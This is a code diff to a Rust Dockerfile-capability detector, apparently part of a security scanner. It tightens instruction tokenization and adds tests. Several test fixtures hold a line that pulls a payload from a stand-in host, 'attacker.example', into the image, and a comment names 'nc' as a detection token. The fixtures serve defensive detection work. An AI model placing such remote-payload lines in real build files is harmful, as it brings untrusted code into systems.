@@ -57,13 +57,16 @@ pub(crate) fn dockerfile_capabilities(content: &str) -> Vec<ArtifactCapabilityFa
     for line in content.lines() {
         let code = strip_inline_hash_comment(line.trim_start());
         let trimmed = code.to_ascii_lowercase();
-        if !has_expose && (trimmed.starts_with("expose ") || trimmed.trim_end() == "expose") {
+        if !has_expose && dockerfile_instruction_args(&trimmed, "expose").is_some() {
             has_expose = true;
         }
-        if !has_run && trimmed.starts_with("run ") {
+        if !has_run && dockerfile_instruction_args(&trimmed, "run").is_some() {
             has_run = true;
         }
-        if !has_copy_or_add && (trimmed.starts_with("copy ") || trimmed.starts_with("add ")) {
+        if !has_copy_or_add
+            && (dockerfile_instruction_args(&trimmed, "copy").is_some()
+                || dockerfile_instruction_args(&trimmed, "add").is_some())
+        {
             has_copy_or_add = true;
         }
         if !has_network_download && dockerfile_has_network_download(&trimmed) {
@@ -121,8 +124,18 @@ pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
 }
 
 fn is_remote_add_instruction(lower_line: &str) -> bool {
-    lower_line.starts_with("add ")
-        && (lower_line.contains("http://") || lower_line.contains("https://"))
+    dockerfile_instruction_args(lower_line, "add")
+        .is_some_and(|args| args.contains("http://") || args.contains("https://"))
+}
+
+fn dockerfile_instruction_args<'a>(lower_line: &'a str, expected: &str) -> Option<&'a str> {
+    let mut tokens = lower_line.split_whitespace();
+    let instruction = tokens.next()?;
+    if instruction != expected {
+        return None;
+    }
+    let args = lower_line.get(instruction.len()..).unwrap_or("");
+    Some(args.trim_start())
 }
 
 fn dockerfile_from_image(line: &str) -> Option<&str> {
@@ -452,6 +465,62 @@ mod tests {
         );
     }
 
+    /// # Contract
+    ///
+    /// Dockerfile instructions are separated from their arguments by shell
+    /// whitespace, not only ASCII spaces. Tabs after `EXPOSE`, `RUN`, `COPY`,
+    /// and `ADD` must preserve the same declared capabilities.
+    #[test]
+    fn dockerfile_capabilities_accepts_tab_after_instruction_keyword() {
+        let content = "FROM alpine\nEXPOSE\t8080\nRUN\techo ok\nCOPY\ttool /usr/bin/tool\n";
+        let caps = dockerfile_capabilities(content);
+        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
+        assert!(capability_present(
+            &caps,
+            ArtifactCapability::ProcessExecution
+        ));
+        assert!(capability_present(
+            &caps,
+            ArtifactCapability::FilesystemWrite
+        ));
+    }
+
+    /// # Contract
+    ///
+    /// `ADD <url> <dest>` has remote-fetch semantics regardless of whether
+    /// Dockerfile whitespace is a space or a tab.
+    #[test]
+    fn dockerfile_capabilities_detects_tab_separated_remote_add_url() {
+        let content = "FROM alpine\nADD\thttps://attacker.example/payload /tmp/payload\n";
+        let caps = dockerfile_capabilities(content);
+        let has_observed_network = caps.iter().any(|fact| {
+            fact.capability == ArtifactCapability::NetworkAccess
+                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+        });
+        assert!(
+            has_observed_network,
+            "tab-separated remote ADD URL must flip observed NetworkAccess; got {caps:?}",
+        );
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Remote-ADD detection requires the real `ADD` instruction token.
+    /// Instruction-name prefixes must not satisfy Dockerfile fetch semantics.
+    #[test]
+    fn dockerfile_capabilities_rejects_remote_add_instruction_substrings() {
+        let content = "FROM alpine\nADDRESS https://attacker.example/payload /tmp/payload\n";
+        let caps = dockerfile_capabilities(content);
+        let has_observed_network = caps.iter().any(|fact| {
+            fact.capability == ArtifactCapability::NetworkAccess
+                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+        });
+        assert!(
+            !has_observed_network,
+            "ADD-prefix instruction must not flip observed NetworkAccess; got {caps:?}",
+        );
+    }
+
     /// Contract: tokens like `nc` MUST require explicit whitespace boundaries
     /// — a substring match against `func`, `unc`, `vncserver`, etc., would
     /// over-fire. This pins the negative case to keep the boundary logic.
@@ -544,6 +613,39 @@ mod tests {
                 .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                     && l.target == "remote-resource"),
             "remote ADD URL must produce a Downloads edge; got {links:?}",
+        );
+    }
+
+    /// # Contract
+    ///
+    /// `ADD <url> <dest>` must produce a Downloads edge when the instruction
+    /// is separated from its URL by a tab.
+    #[test]
+    fn dockerfile_relations_records_download_edge_for_tab_separated_remote_add_url() {
+        let content = "FROM alpine\nADD\thttps://attacker.example/payload /tmp/payload\n";
+        let links = dockerfile_relations(content);
+        assert!(
+            links
+                .iter()
+                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
+                    && l.target == "remote-resource"),
+            "tab-separated remote ADD URL must produce a Downloads edge; got {links:?}",
+        );
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Remote-ADD relation inference requires the real `ADD` instruction
+    /// token, not an instruction-name prefix.
+    #[test]
+    fn dockerfile_relations_rejects_remote_add_instruction_substrings() {
+        let content = "FROM alpine\nADDRESS https://attacker.example/payload /tmp/payload\n";
+        let links = dockerfile_relations(content);
+        assert!(
+            !links
+                .iter()
+                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
+            "ADD-prefix instruction must not produce a Downloads edge; got {links:?}",
         );
     }
 
